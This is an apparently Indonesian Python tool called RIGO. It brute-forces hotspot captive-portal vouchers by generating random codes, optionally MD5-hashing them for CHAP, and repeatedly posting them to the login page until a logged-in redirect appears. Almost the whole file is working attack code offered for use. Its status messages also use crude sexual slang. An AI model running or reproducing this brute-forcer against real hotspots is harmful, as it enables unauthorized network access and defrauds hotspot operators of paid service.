# Self Making with ❤ by Ubaii ID
# Thanks to : stackoverflow, My Family, Allah.

# IMPORT MODULE
import requests as req
import urllib.request as ul
import urllib.error as er
from urllib.parse import urlparse
import hashlib
import random,time,os,sys,configparser

# COLOR LIBRARY
class c:
	purple = '\033[95m'
	ob = '\033[94m'
	oc = '\033[96m'
	og = '\033[92m'
	warn = '\033[93m'
	error = '\033[91m'
	n = '\033[0m'
	BOLD = '\033[1m'
	UNDERLINE = '\033[4m'

def cls():
	command = 'clear'
	if os.name in ('nt', 'dos'):  # If Machine is running on Windows, use cls
		command = 'cls'
	os.system(command)

def banner(ver):
	cls()
	print(f'''{c.og}
		RIGO
 =-------------------------------=
 SIMPLE BRUTEFORCE VOUCHER HOTSPOT
 =-------------------------------={c.oc}
 Version : {ver}
 github.com/ubaii/rigo
 {c.n}''')

def checkUp(ver):
	print(f' [{c.error}!{c.n}] mengecek update...')
	try:
		r = req.get("https://raw.githubusercontent.com/ubaii/rigo/main/ver.txt", timeout=5)
	except(req.ConnectionError, req.Timeout):
		print(f' [{c.error}!{c.n}] tidak dapat mengecek update.')
		print(f' [{c.error}!{c.n}] menghiraukan.')
	if r.text != ver:
		return True
	else:
		return False

def validating(target):
	data = urlparse(target)
	path = data.path
	cek = data.scheme
	if cek == '':
		return False
	elif path == '':
		return False
	else:
		return True

def redirectCheck(target, loginPage, statusPage):
	resp = ul.urlopen(target, timeout=2)
	if resp.geturl() == target+loginPage:
		return 'OK'
	elif resp.geturl() == target+statusPage:
		return 'DL'
	else:
		return resp.geturl()

def grand(totalDigit, randomValue):
	rand = ''
	for i in range(0,int(totalDigit)):
		rand+= random.choice(randomValue)
	return rand

def custRand():
	try:
		read = configparser.ConfigParser()
		read.read(settings)
		chars = read['customRandom']['value1']
		num = read['customRandom']['value2']
		totalChars = read['customRandom']['totalVal1']
		totalNum = read['customRandom']['totalVal2']
		firstPosition = read['customRandom']['firstPosition']
		if chars in ["a-Z","A-z"]:
			chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
		elif chars in ["a-z"]:
			chars = 'abcdefghijklmnopqrstuvwxyz'
		if num in ["0-9"]:
			num = '0123456789'
		char = ''
		nume = ''
		for i in range(0,int(totalChars)):
			char+= random.choice(chars)
		for x in range(0,int(totalNum)):
			nume+= random.choice(num)
		if firstPosition == 'chars':
			return char+nume
		elif firstPosition == 'num':
			return nume+char
		else:
			return char+nume
	except(KeyError) as e:
		print(f' [{c.error}!{c.n}] Error: {e}')
	except(Exception) as e:
		print(f' [{c.error}!{c.n}] Error: {e}')

def checkDuplicate(rand, totalDigit, randomValue):
	kode = []
	with open('data/'+totalDigit+'-'+randomValue+'.txt', "a+") as my_file:
		for line in my_file:
			kode.append(line)
	if rand not in kode:
		return False
	else:
		return True

def uspMode(target, totalDigit, randomValue, loginPage, statusPage, maxLogin, useCustomRandom):
	target_validate = validating(target)
	targets = target+loginPage
	if target_validate is True:
		target_status = ul.urlopen(target).getcode()
		url_alive = target_status == 200
		if url_alive is True:
			t_end = time.time() + 2 * int(maxLogin)
			while time.time() < t_end:
				redirectValidate = redirectCheck(target,loginPage,statusPage)
				if redirectValidate == 'OK':
					if useCustomRandom == 'true':
						if httpChap == 'true':
							rand = custRand()
							awkoawko = hashlib.md5(rand.encode())
							passw = rand
						else:
							rand = custRand()
							passw = rand
					else:
						if httpChap == 'true':
							rand = grand(totalDigit, randomValue)
							awkoawko = hashlib.md5(rand.encode())
							passw = awkoawko.hexdigest()
						else:
							rand = grand(totalDigit, randomValue)
							passw = rand
					dup = checkDuplicate(rand, totalDigit, randomValue)
					if dup is True:
						print(f' [{c.error}!{c.n}] duplicate code detected.')
					else:
						file_random = 'data/'+totalDigit+'-'+randomValue+'.txt'
						filerandom = open(file_random, 'a+')
						filerandom.writelines(f'{rand}\n')
						data = {'username': rand, 'password': passw, 'dst': '', 'popup': 'true'}
						req.post(targets, data = data)
						print(f' [{c.og}*{c.n}] crott -> [{rand}]')
				elif redirectValidate == 'DL':
					print(f' [{c.og}+{c.n}] Anda sudah hamil.')
					exit()
				else:
					print(f' [{c.error}!{c.n}] Tidak dapat melakukan pengencrotan')
					print(f' [{c.error}!{c.n}] Halaman terakhir : {redirectValidate}')
					exit()
		elif url_alive is False:
			print(f' [{c.error}!{c.n}] Url {target} tidak ditemukan.')
			print(f' [{c.error}!{c.n}] Pastikan anda telah terkoneksi ke jaringan hotspot.')
	elif target_validate is False:
		print(f' [{c.error}!{c.n}] Url {target} tidak valid.')
		print(f' [{c.error}!{c.n}] Pastikan menggunakan http/https dan diakhiri dengan tanda /.')
		exit()

def udpMode(target, udpUser, totalDigit, randomValue, loginPage, statusPage, maxLogin, useCustomRandom):
	target_validate = validating(target)
	targets = target+loginPage
	if target_validate is True:
		target_status = ul.urlopen(target).getcode()
		url_alive = target_status == 200
		if url_alive is True:
			t_end = time.time() + 2 * int(maxLogin)
			while time.time() < t_end:
				redirectValidate = redirectCheck(target,loginPage,statusPage)
				if redirectValidate == 'OK':
					if useCustomRandom == 'true':
						if httpChap == 'true':
							rand = grand(totalDigit, randomValue)
							awkoawko = hashlib.md5(rand.encode())
							passw = rand
						else:
							rand = grand(totalDigit, randomValue)
							passw = rand
					else:
						if httpChap == 'true':
							rand = grand(totalDigit, randomValue)
							awkoawko = hashlib.md5(rand.encode())
							passw = awkoawko.hexdigest()
						else:
							rand = grand(totalDigit, randomValue)
							passw = rand
					dup = checkDuplicate(passw, totalDigit, randomValue)
					if dup is True:
						print(f' [{c.error}!{c.n}] duplicate code detected.')
					else:
						file_random = 'data/'+totalDigit+'-'+randomValue+'.txt'
						filerandom = open(file_random, 'a+')
						filerandom.writelines(f'{rand}\n')
						data = {'username': udpUser, 'password': passw, 'dst': '', 'popup': 'true'}
						req.post(targets, data = data)
						print(f' [{c.og}*{c.n}] crott -> [{rand}]')
				elif redirectValidate == 'DL':
					print(f' [{c.og}+{c.n}] Anda sudah hamil.')
					exit()
				else:
					print(f' [{c.error}!{c.n}] Tidak dapat melakukan pengencrotan')
					print(f' [{c.error}!{c.n}] Halaman terakhir : {redirectValidate}')
					exit()
		elif url_alive is False:
			print(f' [{c.error}!{c.n}] Url {target} tidak ditemukan.')
			print(f' [{c.error}!{c.n}] Pastikan anda telah terkoneksi ke jaringan hotspot.')
	elif target_validate is False:
		print(f' [{c.error}!{c.n}] Url {target} tidak valid.')
		print(f' [{c.error}!{c.n}] Pastikan menggunakan http/https dan diakhiri dengan tanda /.')
		exit()

def profileSelector(ver):
	banner(ver)
	try:
		read = configparser.ConfigParser()
		read.read(profile)
		mode = read[selectedProfile]['mode']
		udpUser = read[selectedProfile]['udpUser']
		target = read[selectedProfile]['target']
		totalDigit = read[selectedProfile]['totalDigit']
		randomValue = read[selectedProfile]['randomValue']
		loginPage = read[selectedProfile]['loginPage']
		statusPage = read[selectedProfile]['statusPage']
		maxLogin = read[selectedProfile]['maxLogin']
		useCustomRandom = read[selectedProfile]['useCustomRandom']
		print(f' [{c.ob}-{c.n}] Profile Selected : {selectedProfile}')
		print(f' [{c.ob}-{c.n}] Target Pada profile : {target}')
		print(f' [{c.ob}-{c.n}] Mode pada profile : {mode}')
		print(f' [{c.ob}-{c.n}] Use custom random : {useCustomRandom}')
		print(f' [{c.ob}-{c.n}] Memulai pengencrotan...')
		if mode == 'usp':
			uspMode(target, totalDigit, randomValue, loginPage, statusPage, maxLogin, useCustomRandom)
		elif mode == 'udp':
			udpMode(target, udpUser, totalDigit, randomValue, loginPage, statusPage, maxLogin, useCustomRandom)
		else:
			print(f' [{c.error}!{c.n}] mode {mode} tidak ada didalam program rigo!')
			exit()
	except(FileNotFoundError):
		print(f' [{c.error}!{c.n}] file {profile} tidak ada!!')
	except(KeyError) as e:
		print(f' [{c.error}!{c.n}] Error: {e}')
		print(f' [{c.error}!{c.n}] kesalahan pada konfigurasi profile/settings!!')
	except(Exception):
		exit()

def essentials(ver, internet, update, selectedProfile, termuxAPI, httpChap):
	checked = False
	try:
		with open(ver) as verr:
			ver = verr.read()
	except (FileNotFoundError):
		print(f' [{c.error}!{c.n}] file ver.txt tidak ada!!')
		exit()
	if internet is False:
		update = 'false'
	if update == 'true':
		checked = checkUp(ver)
	if checked is True:
		print(f' [{c.error}!{c.n}] Update tersedia!! harap download ulang / git clone ulang aplikasi ini!')
		print(f' [{c.error}!{c.n}] jika ingin tetap menggunakan versi ini harap ubah checkUpdate menjadi false!!')
		exit()
	profileSelector(ver)

def internetCheck():
	print(f' [{c.error}!{c.n}] mengecek internet..')
	url = "http://google.com/" # ganti aj kalo mw
	timeout = 3
	try:
		req.get(url, timeout=timeout)
		return True
	except (req.ConnectionError, req.Timeout):
		return False

if __name__ == "__main__":
	settings = "settings.ini" # ganti sesuai nama file nya bang :)
	ver = "ver.txt" # ganti sesuai nama file nya bang :)
	profile = "profile.ini" # ganti sesuai nama file nya bang :)
	try:
		read = configparser.ConfigParser()
		read.read(settings)
		update = read['rigo']['checkUpdate']
		selectedProfile = read['rigo']['selectedProfile']
		termuxAPI = read['rigo']['termuxAPI']
		httpChap = read['rigo']['httpChap']
		internet = internetCheck()
		if os.name in ('nt', 'dos'):
			if termuxAPI is True:
				print(f' [{c.error}!{c.n}] Anda menggunakan os windows! harap ubah termuxAPI manjadi False')
				exit()
		essentials(ver, internet, update, selectedProfile, termuxAPI, httpChap)
	except(KeyboardInterrupt):
		print(f' [{c.error}!{c.n}] keluar secara paksa.')
	except(FileNotFoundError):
		print(f' [{c.error}!{c.n}] file {settings} tidak ada!!')
	except(KeyError):
		print(f' [{c.error}!{c.n}] kesalahan dalam settingan pada file {settings}!!')
	except(SystemExit):
		print(f' [{c.error}!{c.n}] Pengencrotan selesai.')
	except(er.URLError) as e:
			print(f'\n [{c.error}!{c.n}] Gagal menghubungkan ke target.')
			print(f' [{c.error}!{c.n}] Pastikan anda sudah terhubung ke jaringan hotspot.')
	except(Exception) as e:
		print(f' [{c.error}!{c.n}] Error: {e}')
		print(f' [{c.error}!{c.n}] Kesalahan tidak diketahui.')